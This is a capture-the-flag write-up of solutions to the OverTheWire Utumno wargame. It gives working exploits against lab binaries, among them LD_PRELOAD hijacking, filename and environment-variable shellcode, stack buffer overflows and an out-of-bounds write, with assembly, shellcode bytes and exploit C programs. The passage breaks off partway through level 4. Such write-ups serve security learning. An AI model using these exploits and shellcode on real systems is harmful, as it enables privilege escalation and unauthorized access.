---
layout: post
title: "[OverTheWire] Utumno Wargame Solutions"
date: 2025-10-09
categories: [OverTheWire, Utumno]
---

# {{ page.title }}

## Utumno Wargame Brief
*"This is a regular wargame composed of 10 different levels. It's slightly harder than the
previous wargames in the same genre. Actually, it's a lot harder than Leviathan and a bit
harder than Behemoth so if you haven't beaten those two you will probably want to do that
first."*

All challenge files are located in **/utumno/**.\
Once a challenge is solved, the password for the next challenge can be located in **/etc/utumno_pass/utumno{challenge number}**.

**OverTheWire Utumno Wargame:** [https://overthewire.org/wargames/utumno/](https://overthewire.org/wargames/utumno/)

**Difficulty:** 4/10

**Host:** utumno.labs.overthewire.org\
**Port:** 2227

---
---
## Challenge Solutions:
- [Utumno0 Solution](#utumno0-solution)
- [Utumno1 Solution](#utumno1-solution)
- [Utumno2 Solution](#utumno2-solution)
- [Utumno3 Solution](#utumno3-solution)
- [Utumno4 Solution](#utumno4-solution)
- [Utumno5 Solution](#utumno5-solution)
- [Utumno6 Solution](#utumno6-solution)
- [Utumno7 Solution](#utumno7-solution)

---
---
## Utumno0 Solution
**Username:** utumno0\
**Password:** utumno0

When running the binary, the only action it seems to perform is printing the message *"Read me! :P"*. However, when trying to read the file using `cat` or `strings`, or even opening the binary with `GDB` it fails with a **Permission Denied** error.\
Looking at the binaries permissions, we see that it is only executable, nothing else.
```bash
---x--x--- 1 utumno1 utumno0 12K Aug 15 13:18 /utumno/utumno0
```

The fact that the binary prints a string, we can deduce that it makes a function call to a function like `puts()` or `printf()`. To exploit this, we can use **LD_PRELOAD** to load a custom **Shared Object** before any other libraries are loaded.

This would allow us to create a *malicious* copy of one of the functions which will get called before the real version of the function from **LIBC**.

### Exploit:
To discover which function is being called, we can write a C script containing our own version of each of the functions, then use the **LD_PRELOAD** environment variable to point to our **Shared Object** and run the binary. Then when the binary attempts to call the function, it will call *our* function and perform whatever action we set it to do.

```c
#include <stdio.h>
#include <stdlib.h>

int puts ( const char * str ) {
        unsetenv("LD_PRELOAD");
        printf("I called PUTS()\n");
        return 0;
}
```

Compile the shared object using:\
`gcc preload.c -o preload.so -fPIC -shared -ldl -m32`

Finally, run the binary with **LD_PRELOAD** set.

```bash
utumno0@utumno:/tmp/.work$ LD_PRELOAD=/tmp/.work/preload.so /utumno/utumno0
I called PUTS()
```
The fact that it output *"I called PUTS()"* shows that the binary is calling the `puts()` function to print the message *"Read me! :P"*. If it still printed the original *"Read me"* message, then that would show that the binary was not calling `puts()` and instead is calling another function. In that case, we would simply modify the C script to look like so:
```c
#include <stdio.h>
#include <stdlib.h>

int printf ( const char *format, ... ) {
        unsetenv("LD_PRELOAD");
        puts("I called PRINTF()\n");
        return 0;
}
```

Due to the binary not being **SUID** and not having any read permissions, we cannot just spawn a shell or use something like `strings` to read the binary via a `system()` function call. Instead we need to *read* the binary via other methods, such as leaking valued from the stack as if you would when performing a **Format String** vulnerability exploit.

```c
#include <stdio.h>
#include <stdlib.h>

int puts ( const char * str ) {
        unsetenv("LD_PRELOAD");
        printf("%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p");
        return 0;
}
```
Compile the script again. Compiling it will cause **gcc** to output some warnings about the `printf()` call, however it will still compile. Then running the binary again with the new **Shared Object**, it will leak values from the stack.

```bash
utumno0@utumno:/tmp/.work$ LD_PRELOAD=/tmp/.work/preload.so /utumno/utumno0
0xf7fdabb0 0xffffd3a0 0xf7fbd169 0x804907d 0xf7fa8e34 0xffffd378 0x804917d 0x804a01d 0x804a008 (nil) 0xf7d9ccb9 0x1 0xffffd434 0xffffd43c 0xffffd3a0
```
There are a few notable addresses leaked here, most of them are kernel or library addresses, however `0x804907d`, `0x804917d`, `0x804a01d`, and `0x804a008` are addresses that the process has access to.\
We can modify the C script again to try read string values from these addresses.

```c
#include <stdio.h>
#include <stdlib.h>

int puts ( const char * str ) {
        unsetenv("LD_PRELOAD");
        printf("%s\n", 0x804907d);
        printf("%s\n", 0x804917d);
        printf("%s\n", 0x804a01d);
        printf("%s\n", 0x804a008);
        return 0;
}
```
Again, compiling the script into a **Shared Object** and running the binary again with **LD_PRELOAD** it leaks the password for the next challenge.

```bash
utumno0@utumno:/tmp/tasks$ LD_PRELOAD=/tmp/tasks/preload.so /utumno/utumno0
Read me! :P
password: y[REDACTED]L
```

---
---
## Utumno1 Solution
**Username:** utumno1\
**Password:** [REDACTED]

### Disassembly:
```c
int32_t run(void* p)
{
    void* gsbase;
    int32_t eax_1 = *(gsbase + 0x14);
    strncpy(rwx, p, 0x1000);
    __return_addr = rwx;
    
    if (eax_1 == *(gsbase + 0x14))
        return eax_1 - *(gsbase + 0x14);
    
    __stack_chk_fail();
    /* no return */
}

int main(int argc, char** argv)
{
    if (!argv[1])
    {
        exit(1);
        /* no return */
    }
    
    rwx = mmap(nullptr, 0x1000, 7, 0x22, 0xffffffff, 0);
    
    if (!rwx)
    {
        exit(2);
        /* no return */
    }
    
    DIR* dirp = opendir(argv[1]);
    
    if (!dirp)
    {
        exit(1);
        /* no return */
    }
    
    while (true)
    {
        struct dirent* eax_14 = readdir(dirp);
        
        if (!eax_14)
            break;
        
        if (!strncmp("sh_", &eax_14->d_name, 3))
            run(&eax_14->d_name[3]);
    }
    
    return 0;
}
```
This challenge is somewhat straight forward. It first allocates a `read-write-execute` section of memory. After this, it calls the `opendir()` function, passing `argv[1]` to it.\
If it is able to open the directory, then it begins to iterate through each filename in the directory via the `readdir()` function.\
For each filename in the directory, it checks to see if the first 3 characters are *"sh_"*, if they are not then it just continues iterating through filenames. However, if it matches, then it calls the `run()` function passing the filename.

The `run()` function just copies the filename after the *"sh_"* into the `read-write-execute` section of memory and then returns to that address, attempting to execute whatever is in the section of memory. Such as shellcode.

### Exploit Setup:
To solve this challenge, we can just create a file starting with the string **"sh_"** and followed by some shellcode. However, there is a caveat, we cannot just put any shellcode such as one that calls **"/bin/sh"** because when we try to create the file, it will contain **/** characters which cannot be included in a filename.

To get around this, we can create a symlink to **/bin/bash**, naming it something like *"code"* and then use `execve("code")` to call that symlink, in turn, calling **/bin/bash**, completely avoiding any **/** characters.\
To maintain privileges when spawning the shell, because the challenge binary is **SUID**, I am going to call the symlink and pass **-p**, `execve("code", ["code", "-p"])`.

#### shell.asm
```nasm
section .text
global _start

_start:
        xor ecx, ecx            ; null ecx (0)
        mul ecx                 ; eax, ecx, edx = 0

        push eax                ; null terminator
        push 0x65646f63         ; push "code"
        mov ebx, esp            ; move pointer to "code" into ebx

        push eax                ; null terminator
        push word 0x702d        ; move "-p" into cx
        mov ecx, esp            ; move pointer to "-p" into ecx

        push eax                ; null terminator
        push ecx                ; push pointer to "-p"
        push ebx                ; push pointer to "code"
        mov ecx, esp            ; move pointer to {"code", "-p"} into ecx

        mov al, 0xb             ; move "0xb" into al (execve)
        int 0x80                ; call execve
```

#### compile.sh
```bash
#!/bin/bash

nasm -f elf -o shell.o shell.asm
ld -m elf_i386 -o shell shell.o

echo -e "SHELLCODE:\n"
printf '\\x' && objdump -d shell | grep "^ " | cut -f2 | tr -d ' ' | tr -d '\n' | sed 's/.\{2\}/&\\x /g'| head -c-3 | tr -d ' ' && echo ' '
```

```bash
utumno1@utumno:/tmp/tasks/utumno1$ ./compile.sh
SHELLCODE:

\x31\xc9\xf7\xe1\x50\x68\x63\x6f\x64\x65\x89\xe3\x50\x66\x68\x2d\x70\x89\xe1\x50\x51\x53\x89\xe1\xb0\x0b\xcd\x80
```

Once the assembly is compiled and linked, we need to create the *"code"* symlink.
```bash
ln -s /bin/bash ./code
```

The final step is to create the file starting with *"sh_"* followed by the shellcode.
```bash
touch sh_$(perl -e 'print "\x31\xc9\xf7\xe1\x50\x68\x63\x6f\x64\x65\x89\xe3\x50\x66\x68\x2d\x70\x89\xe1\x50\x51\x53\x89\xe1\xb0\x0b\xcd\x80"')
```

### Exploit:
Finally, we can run the challenge binary and pass the directory of our **sh_{SHELLCODE}** file.

```bash
utumno1@utumno:/tmp/tasks/utumno1$ /utumno/utumno1 $(pwd)
code-5.2$ whoami
utumno2
```

---
---
## Utumno2 Solution:
**Username:** utumno2\
**Password:** [REDACTED]

### Disassembly:
```c
int main(int argc, char** argv)
{
    if (!argc || (argc == 1 && !**argv))
    {
        char var_10;
        strcpy(&var_10, argv[0xa]);
        return 0;
    }
    
    puts("Aw..");
    exit(1);
}
```
This binary seems somewhat straight forward at a first look, a simple **Buffer Overflow** caused by the `strcpy()` function writing the 10th (**0xa**) argument into the single character buffer **var_10**. However, above that, there is an **if** statement which makes it more awkward to exploit.

```c
if (!argc || (argc == 1 && !**argv))
```
This single line performs two checks.\
It returns **True** if:\
`!argc` - There are zero arguments.\
Or\
`(argc == 1 && !**argv)` - Exactly one argument is passed and it is an empty string.

When running the bianry via the command line, there will always be 1 argument, the name of the binary being run. So, the first check will fail because there are arguments. Furthermore, it will also make the second check fail because there is exactly 1 argument, but it is not an empty string, it will be **"/utumno/utumno2"**.

There is a way around this, by running the binary using `execve()`, we can control what arguments and environment variables are passed, allowing us to bypass the check.

### Exploit Setup:
```c
#include <unistd.h>

// gcc -m32 -static run.c -o run

int main()
{
    char *argv[] = {NULL};
    char *envp[] = {NULL};
    execve("/utumno/utumno2", argv, envp);
    return 0;
}
```

Since we cannot have any arguments, to be able to bypass the check and continue execution, we can instead use environment variables. 

The reason this works is because of how `argc`, `argv`, and `envp` are layed out.

#### Usual Stack Layout:
| --------------------------------\
| argc (number of argv)       \
| -------------------------------- \
| argv[0] (binary being run)\
| argv[1]\
| ...\
| NULL (end of argv)\
| envp[0]\
| envp[1]\
| ...\
| NULL (end of envp)\
| --------------------------------

#### Our Stack Layout:
| --------------------------------\
| argc (number of argv)      \
| -------------------------------- \
| argv[0] (binary being run)\
| NULL (end of argv)\
| envp[0]\
| ...\
| envp[10]\
| NULL (end of envp)\
| --------------------------------

We bypass the initial checks by sending zero arguments, allowing continued execution to the `strcpy()` function call where it copies the 10th (**0xa**) `argv` into the single character buffer. However, because there are no `argv` arguments, it *"indexes past"* `argv` and into `envp`.

This means that we can put some value into the 9th environment variable pointer and that will be copied into the single character buffer by `strcpy()`.

```c
#include <unistd.h>

int main(){
    char *argv[] = {NULL};

    char *envp[] = {"", "", "", "", "", "", "", "",
    "AAAABBBBCCCCDDDDEEEEFFFF",
    NULL};

    execve("/utumno/utumno2", argv, envp);
}
```
Compiling and running the binary using `strace`, we can see that we have overwritten the return address (**EIP**) causing a **Segmentation Fault**.
```bash
{SNIPPED}
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x45454545} ---
+++ killed by SIGSEGV (core dumped) +++
Segmentation fault (core dumped)
```

The return address was overwritten with **0x45454545** which is **EEEE**. This means there is an offset of 16-bytes before overwriting the return address.

To finish the exploit, we need to put shellcode somewhere on the stack where we can return to. To do this, we can just put it into the environment variable pointer before our overflow payload.

```c
#include <unistd.h>

int main(){
    char *argv[] = {NULL};

    char *envp[] = {"", "", "", "", "", "", "",
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x66\x68\x2d\x70\x89\xe1\x50\x51\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80",
    "AAAABBBBCCCCDDDDXXXX",
    NULL};

    execve("/utumno/utumno2", argv, envp);
}
```
I used 20 **NOPs** just as a buffer between any other data on the stack and the shellcode and shellcode that spawns a shell via `execve("/bin/sh", ["/bin/sh", "-p"])` to maintain privileges.

To locate the address of the shellcode on the stack, we can compile the new binary and run it in **GDB-GEF**. When the binary **segfaults**, we can use the command `x/20s *environ` to locate the address of the shellcode.

```bash
gef>  x/20s *environ
0xffffdf96:     ""
0xffffdf97:     ""
0xffffdf98:     ""
0xffffdf99:     ""
0xffffdf9a:     ""
0xffffdf9b:     ""
0xffffdf9c:     ""
0xffffdf9d:     '\220' <repeats 20 times>, "1\300Ph//shh/bin\211\343Pfh-p\211\341PQS\211\3411Ұ\v̀"
0xffffdfd3:     "AAAABBBBCCCCDDDDXXXX"
```
The address of where the shellcode is located on the stack is **0xffffdf9d**, so we can replace the **XXXX** in the overflow payload with the address, compile the binary, and run it to get a shell.

```c
#include <unistd.h>

int main(){
    char *argv[] = {NULL};

    char *envp[] = {"", "", "", "", "", "", "",
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x66\x68\x2d\x70\x89\xe1\x50\x51\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80",
    "AAAABBBBCCCCDDDD\x9d\xdf\xff\xff",
    NULL};

    execve("/utumno/utumno2", argv, envp);
}
```

### Exploit:
```bash
utumno2@utumno:/tmp/tasks/utumno2$ gcc -m32 -static ./run.c -o run
utumno2@utumno:/tmp/tasks/utumno2$ ./run
$ whoami
utumno3
```

---
---
## Utumno3 Solution
**Username:** utumno3\
**Password:** [REDACTED]

### Disassembly:
#### Decompilation from BinaryNinja:
```c
int main(int argc, char** argv)
{
    int32_t var_8 = 0;
    
    while (true)
    {
        int32_t eax_17 = getchar();
        
        if (eax_17 == 0xffffffff || var_8 > 0x17)
            return 0;
        
        char var_3c[0x18];
        var_3c[var_8] = eax_17;
        var_3c[var_8] ^= var_8 * 3;
        char var_24[0x18];
        var_24[var_3c[var_8]] = getchar();
        var_8 += 1;
    }
}
```

#### Disassembly from GDB:
```bash
Dump of assembler code for function main:
   0x08049166 <+0>:     push   ebp
   0x08049167 <+1>:     mov    ebp,esp
   0x08049169 <+3>:     sub    esp,0x38
   0x0804916c <+6>:     mov    DWORD PTR [ebp-0x8],0x0
   0x08049173 <+13>:    mov    eax,DWORD PTR [ebp-0x8]
   0x08049176 <+16>:    mov    DWORD PTR [ebp-0x4],eax
   0x08049179 <+19>:    jmp    0x80491cb <main+101>
   0x0804917b <+21>:    mov    eax,DWORD PTR [ebp-0x8]
   0x0804917e <+24>:    mov    ecx,eax
   0x08049180 <+26>:    lea    edx,[ebp-0x38]
   0x08049183 <+29>:    mov    eax,DWORD PTR [ebp-0x4]
   0x08049186 <+32>:    add    eax,edx
   0x08049188 <+34>:    mov    BYTE PTR [eax],cl
   0x0804918a <+36>:    lea    edx,[ebp-0x38]
   0x0804918d <+39>:    mov    eax,DWORD PTR [ebp-0x4]
   0x08049190 <+42>:    add    eax,edx
   0x08049192 <+44>:    movzx  edx,BYTE PTR [eax]
   0x08049195 <+47>:    mov    eax,DWORD PTR [ebp-0x4]
   0x08049198 <+50>:    mov    ecx,eax
   0x0804919a <+52>:    mov    eax,ecx
   0x0804919c <+54>:    add    eax,eax
   0x0804919e <+56>:    add    eax,ecx
   0x080491a0 <+58>:    xor    edx,eax
   0x080491a2 <+60>:    lea    ecx,[ebp-0x38]
   0x080491a5 <+63>:    mov    eax,DWORD PTR [ebp-0x4]
   0x080491a8 <+66>:    add    eax,ecx
   0x080491aa <+68>:    mov    BYTE PTR [eax],dl
   0x080491ac <+70>:    call   0x8049040 <getchar@plt>
   0x080491b1 <+75>:    mov    ecx,eax
   0x080491b3 <+77>:    lea    edx,[ebp-0x38]
   0x080491b6 <+80>:    mov    eax,DWORD PTR [ebp-0x4]
   0x080491b9 <+83>:    add    eax,edx
   0x080491bb <+85>:    movzx  eax,BYTE PTR [eax]
   0x080491be <+88>:    movsx  eax,al
   0x080491c1 <+91>:    mov    edx,ecx
   0x080491c3 <+93>:    mov    BYTE PTR [ebp+eax*1-0x20],dl
   0x080491c7 <+97>:    add    DWORD PTR [ebp-0x4],0x1
   0x080491cb <+101>:   call   0x8049040 <getchar@plt>
   0x080491d0 <+106>:   mov    DWORD PTR [ebp-0x8],eax
   0x080491d3 <+109>:   cmp    DWORD PTR [ebp-0x8],0xffffffff
   0x080491d7 <+113>:   je     0x80491df <main+121>
   0x080491d9 <+115>:   cmp    DWORD PTR [ebp-0x4],0x17
   0x080491dd <+119>:   jle    0x804917b <main+21>
   0x080491df <+121>:   mov    eax,0x0
   0x080491e4 <+126>:   leave
   0x080491e5 <+127>:   ret
```

Breaking the `main()` function down, we can see before the `while true` loop, it defines a variable `var_8` and sets it to zero, which acts as a *loop counter*.\
Within the **while** loop, per loop it:\
- Gets a single byte of input from **stdin** and stores it in the variable `eax_17`\
```c
int32_t eax_17 = getchar();
```

- Checks to if `getchar()` returns **0xffffffff** or if `var_8` is greater than 23 (**0x17**)\
```c
if (eax_17 == 0xffffffff || var_8 > 0x17)
        return 0;
```

- Defines a 24-byte (**0x18**) character array\
```c
char var_3c[0x18];
```

- Inserts the character in `eax_17` into the buffer `var_3c` at the index of the *loop counter* `var_8`, before replacing the value in the buffer at that index with itself **xor'ed** by the *loop counter* (`var_8`) by **3**\
```c
var_3c[var_8] = eax_17;
var_3c[var_8] ^= var_8 * 3;
```

- Defines another 24-byte (**0x18**) buffer named `var_24`\
```c
char var_24[0x18];
```

- Reads a second byte of input from **stdin** and writes it into the buffer `var_24` at the index of `var_3c[var_8]`, before incrementing the *loop_counter* `var_8` by 1\
```c
var_24[var_3c[var_8]] = getchar();
var_8 += 1;
```

Breaking it down makes it easier to understand that at the second call to `getchar()` writes the value entered into a location controlled by the first byte, which leads to an **Out of Bounds** write.

#### Step Through Example:
I will step through 3 loops to demonstrate how it is vulnerable.

```text
# First Loop
var_8 (loop counter) = 0
eax_17 (first byte of input) = "A" (hex: 0x41) (decimal: 65)

var_3c[var_8 (0)] = {65}
var_3c[var_8 (0)] = {65} (65 xor (0 * 3) == 65)

var_24[var_3c[var_8] (65)] = {}
[The var_24 buffer is only 24-bytes long, because it uses the character "A" as the index, it will write AFTER the buffer. Somewhere on the stack.]

# Second Loop
var_8 (loop counter) = 1
eax_17 (first byte of input) = "B" (hex: 0x42) (decimal: 66)

var_3c[var_8 (1)] = {65, 66}
var_3c[var_8 (1)] = {65, 66} (66 xor (1 * 3) == 66)

var_24[var_3c[var_8] (66)] = {}
[The var_24 buffer is only 24-bytes long, because it uses the character "B" as the index, it will write AFTER the buffer. Somewhere on the stack.]

# Third Loop
var_8 (loop counter) = 2
eax_17 (first byte of input) = "C" (hex: 0x43) (decimal: 67)

var_3c[var_8 (2)] = {65, 66, 67}
var_3c[var_8 (2)] = {65, 66, 69} (67 xor (2 * 3) == 69)

var_24[var_3c[var_8] (69)] = {}
[The var_24 buffer is only 24-bytes long, because it uses the character "E" (69) as the index, it will write AFTER the buffer. Somewhere on the stack.]
```

### Exploit Setup:
We can write a single byte somewhere onto the stack, controlling the location by the first byte we send. To control the return address, we need to find out where the return address is located in comparison to the buffer we write to `var_24`.

```bash
0x080491aa <+68>:    mov    BYTE PTR [eax],dl
0x080491ac <+70>:    call   0x8049040 <getchar@plt>
{SNIPPED}
0x080491c3 <+93>:    mov    BYTE PTR [ebp+eax*1-0x20],dl
0x080491c7 <+97>:    add    DWORD PTR [ebp-0x4],0x1
0x080491cb <+101>:   call   0x8049040 <getchar@plt>
```
We can see, after the first call the `getchar()`, the first byte we send will be stored in the **EAX** (`mov BYTE PTR [eax],dl`). Then, at the second call to `getchar()` the second byte we send is written to the address calculated by `ebp+eax*1-0x20`.\
Knowing how the location is calculated, we can calculate what bytes we need to send to dictate where we write the second byte we send to.

First, we need to find out the address of **EBP**, we can do this using **GDB**.
```bash
# Set a breakpoint just after the second call to getchar()
gef>  b *main+106
Breakpoint 1 at 0x80491d0: file utumno3.c, line 27.
gef>  x/8xw $ebp
0xffffd388:     0x00000000      0xf7da1cb9      0x00000001      0xffffd444
0xffffd398:     0xffffd44c      0xffffd3b0      0xf7fade34      0x0804907d
```
This shows that the address of **EBP** is `0xffffd388`, which means that the return address is 4-bytes after `0xffffd38c` (**0xf7da1cb9**).

The first byte of the return address **b9** is located at `0xffffd38c`, the second byte **1c** is at `0xffffd38d`, the third byte **da** is at `0xffffd38e`, and the fourth **f7** is at `0xffffd38e`.

To calculate the bytes we need to send to overwrite the return address, I wrote a **Python** script to *brute force* the bytes. As there are only 255 possible bytes (0x01 through 0xFF) it is incredibly quick and prevents the need for quess work.

```python
def calculate(value, index):
    # XOR the value by the index multiplied by 3
    xored = value ^ (index * 3)
    # Add the XOR'ed value (EAX) to the address of EBP
    add = 0xffffd388 + xored
    # Subtract 0x20 from the claulated (EBP + EAX)
    address = hex(add - 0x20)
    # Return the calculated address
    return address

def main():
    # Target addresses of 1st byte, 2nd byte, 3rd byte, and 4th byte of the return address
    targets = ['0xffffd38c', '0xffffd38d', '0xffffd38e', '0xffffd38f']
    
    for index, target in enumerate(targets):
        # Iterate through the values 0x01 - 0xFF (1 - 256) 
        for value in range(1, 256):
            # Calculate the address by calling the "calculate" function
            address = calculate(value, index)
            # Compare the calculated address against the target address
            if address == target:
                # If the calculated address matches the target address, print the value and break
                print(f"[*] Target: {target} - Value: 0x{value:02X}")
                break

if __name__ == '__main__':
    main()
```

```bash
[*] Target: 0xffffd38c - Value: 0x24
[*] Target: 0xffffd38d - Value: 0x26
[*] Target: 0xffffd38e - Value: 0x20
[*] Target: 0xffffd38f - Value: 0x2E
```

Now we have the values we need to send as the first byte for each loop, we can attempt to overwrite the return address with just 4 "A's" to check it works.

```bash
utumno3@utumno:/tmp/tasks/utumno3$ perl -e 'print "\x24\x41\x26\x41\x20\x41\x2e\x41"' | strace /utumno/utumno3
execve("/utumno/utumno3", ["/utumno/utumno3"], 0x7fffffffe340 /* 28 vars */) = 0
[ Process PID=17583 runs in 32 bit mode. ]
{SNIPPED}
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x41414141} ---
+++ killed by SIGSEGV (core dumped) +++
Segmentation fault (core dumped)
```

The return address is successfully overwritten with **0x41414141** (**AAAA**) which causes a **Segmentation Fault**.\
Now we need somewhere to return to, for this I am going to use an environment variable to hold the shellcode. Using shellcode to spawn a shell somewhat works, it successfully runs **/bin/sh** however it fails due to an **ioctl** error. So instead, I am going to write some custom shellcode to simply read the password file (**/etc/utumno_pass/utumno4**).

#### read.asm
```nasm
section .text
global _start

_start:
        xor ecx, ecx            ; ecx = 0
        mul ecx                 ; eax, ecx, edx = 0

        push eax                ; null terminator
        push 0x7461632f         ; push "/cat"
        push 0x6e69622f         ; push "/bin"
        mov ebx, esp            ; move pointer to "/bin/cat" into ebx

        push eax                ; null terminator
        push 0x73736170         ; push "pass" (symlink to password file)
        mov ecx, esp            ; move pointer to "pass" into ecx

        push eax                ; null terminator
        push ecx                ; push pointer to "pass"
        push ebx                ; push pointer to "/bin/cat"
        mov ecx, esp            ; move pointer to {"/bin/cat", "pass"} into ecx

        mov al, 0xb             ; move execve syscall number into al
        int 0x80                ; call execve
```

#### compile.sh
```bash
#!/bin/bash

nasm -f elf -o "read.o" "read.asm"
ld -m elf_i386 -o "read" "read.o"

echo -e "SHELLCODE:\n"
printf '\\x' && objdump -d "read" | grep "^ " | cut -f2 | tr -d ' ' | tr -d '\n' | sed 's/.\{2\}/&\\x /g'| head -c-3 | tr -d ' ' && echo ' '
```

Create a symlink pointing to the password file named **"pass"**.
```bash
ln -s /etc/utumno_pass/utumno4 ./pass
```

Compile the assembly and put the shellcode into an environment variable and use the **/find_env** script to find the address of the environment variable on the stack.

#### find_env.c
```c
#include <stdio.h>
#include <stdlib.h>

// gcc -m32 -o /tmp/find_env /tmp/find_env.c

int main(int argc, char* argv[])
{
  printf("%s is at %p\n", argv[1], getenv(argv[1]));
}
```

### Exploit
```bash
utumno3@utumno:/tmp/tasks/utumno3$ ./compile.sh
SHELLCODE:

\x31\xc9\xf7\xe1\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x70\x61\x73\x73\x89\xe1\x50\x51\x53\x89\xe1\xb0\x0b\xcd\x80

utumno3@utumno:/tmp/tasks/utumno3$ export SHELLCODE=$(perl -e 'print "\x90"x20 . "\x31\xc9\xf7\xe1\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x70\x61\x73\x73\x89\xe1\x50\x51\x53\x89\xe1\xb0\x0b\xcd\x80"')

utumno3@utumno:/tmp/tasks/utumno3$ ./find_env SHELLCODE
SHELLCODE is at 0xffffd5ac

utumno3@utumno:/tmp/tasks/utumno3$ perl -e 'print "\x24\xac\x26\xd5\x20\xff\x2e\xff"' | /utumno/utumno3
q[REDACTED]5
```

---
---
## Utumno4 Solution
**Username:** utumno4\
**Password:** [REDACTED]

### Disassembly:
```c
int main(int argc, char** argv)
{
    int32_t __saved_ebp;
    int32_t* i = &__saved_ebp;
    void var_f004;
    
    do
    {
        i -= 0x1000;
        *i = *i;
    } while (i != &var_f004);
    
    int32_t eax_3 = atoi(argv[1]);
    
    if (eax_3 <= 0x3f)
    {
        void var_ff06;
        memcpy(&var_ff06, argv[2], eax_3);
        return 0;
    }
    
    exit(1);
}
```
The `main()` function starts by assiging the variable `i` to the saved **EBP**. It then goes into a **do-while** loop which decrements `i` by **0x1000** until it is equal to a pre-defined local. From research I discovered that this is named *"Stack Probing"*.

After the **do-while** loop, it converts the value passed in the first argument to the binary (`argv[1]`) into an integer. It then checks if the value is less than of equal to 63 (**0x3f**). If the check returns false, then it will exit, however if it returns true then it copies the size of `argv[1]` from `argv[2]` into the local buffer `var_ff06`.

Attempting to run the binary and passing the integer *63* or below in `argv[1]` and then a string 63-bytes long, it just copies the string into the buffer and exits. We need to find a way to copy a large string into the buffer to overflow it and overwrite the return address.

```bash
Dump of assembler code for function main:
   0x08049186 <+0>:     push   ebp
   0x08049187 <+1>:     mov    ebp,esp
   0x08049189 <+3>:     lea    eax,[esp-0xf000]
   0x08049190 <+10>:    sub    esp,0x1000
   0x08049196 <+16>:    or     DWORD PTR [esp],0x0
   0x0804919a <+20>:    cmp    esp,eax
   0x0804919c <+22>:    jne    0x8049190 <main+10>
   0x0804919e <+24>:    sub    esp,0xf04
   0x080491a4 <+30>:    mov    eax,DWORD PTR [ebp+0xc]
   0x080491a7 <+33>:    add    eax,0x4
   0x080491aa <+36>:    mov    eax,DWORD PTR [eax]
   0x080491ac <+38>:    push   eax
   0x080491ad <+39>:    call   0x8049060 <atoi@plt>
   0x080491b2 <+44>:    add    esp,0x4
   0x080491b5 <+47>:    mov    DWORD PTR [ebp-0x4],eax
   0x080491b8 <+50>:    mov    eax,DWORD PTR [ebp-0x4]
   0x080491bb <+53>:    mov    WORD PTR [ebp-0x6],ax
   0x080491bf <+57>:    cmp    WORD PTR [ebp-0x6],0x3f
   0x080491c4 <+62>:    jbe    0x80491cd <main+71>
   0x080491c6 <+64>:    push   0x1
   0x080491c8 <+66>:    call   0x8049050 <exit@plt>
   0x080491cd <+71>:    mov    edx,DWORD PTR [ebp-0x4]
   0x080491d0 <+74>:    mov    eax,DWORD PTR [ebp+0xc]
   0x080491d3 <+77>:    add    eax,0x8
   0x080491d6 <+80>:    mov    eax,DWORD PTR [eax]
   0x080491d8 <+82>:    push   edx
   0x080491d9 <+83>:    push   eax
   0x080491da <+84>:    lea    eax,[ebp-0xff02]
   0x080491e0 <+90>:    push   eax
   0x080491e1 <+91>:    call   0x8049040 <memcpy@plt>
   0x080491e6 <+96>:    add    esp,0xc
   0x080491e9 <+99>:    mov    eax,0x0
   0x080491ee <+104>:   leave
   0x080491ef <+105>:   ret
```

Looking at the disassembly of the main function in **GDB**, particularly this section:\
```bash
0x080491ac <+38>:    push   eax
0x080491ad <+39>:    call   0x8049060 <atoi@plt>
0x080491b2 <+44>:    add    esp,0x4
0x080491b5 <+47>:    mov    DWORD PTR [ebp-0x4],eax
0x080491b8 <+50>:    mov    eax,DWORD PTR [ebp-0x4]
0x080491bb <+53>:    mov    WORD PTR [ebp-0x6],ax
0x080491bf <+57>:    cmp    WORD PTR [ebp-0x6],0x3f
```
We can see that the output from the `atio()` function call is put into **EAX**, then the **AX** (the lower half of **EAX**) is moved into a word pointer at **EBP-0x6** (`mov WORD PTR [ebp-0x6], ax`). Finally, the word pointer to `EBP-0x6` is compared against **0x3f**. This means only the lower half of the **EAX** is compared against **0x3f** in the if statement.\
We can pass the integer **65536** in `argv[1]` which the function call to `atoi()` will put the value **0x00010000** into **EAX**. The lower half of **EAX** (**AX**) is now `0x0000` which satisfies the **if** statement as it is lower than 63 (**0x3f**).\
This also means, that we can copy a string length of **65536** into the local buffer.

```bash
gef> run 65536 $(pwn cyclic 65536)
[ Legend: Modified register | Code | Heap | Stack | String ]
──── registers ────
$eax   : 0x0
$ebx   : 0xf7fade34  →  ",\r#"
$ecx   : 0xfffed3c0  →  "bazqcazqdazqeazqfazqgazqhazqiazqjazqkazqlazqmazqna[...]"
$edx   : 0xfffdd476  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$esp   : 0xfffed380  →  "kazplazpmazpnazpoazppazpqazprazpsazptazpuazpvazpwa[...]"
$ebp   : 0x707a6169 ("iazp"?)
$esi   : 0xfffed444  →  "jazrkazrlazrmazrnazroazrpazrqazrrazrsazrtazruazrva[...]"
$edi   : 0xf7ffcb60  →  0x00000000
$eip   : 0x707a616a ("jazp"?)
$eflags: [zero carry PARITY ADJUST SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
──── stack ────
0xfffed380│+0x0000: "kazplazpmazpnazpoazppazpqazprazpsazptazpuazpvazpwa[...]"    ← $esp
0xfffed384│+0x0004: "lazpmazpnazpoazppazpqazprazpsazptazpuazpvazpwazpxa[...]"
0xfffed388│+0x0008: "mazpnazpoazppazpqazprazpsazptazpuazpvazpwazpxazpya[...]"
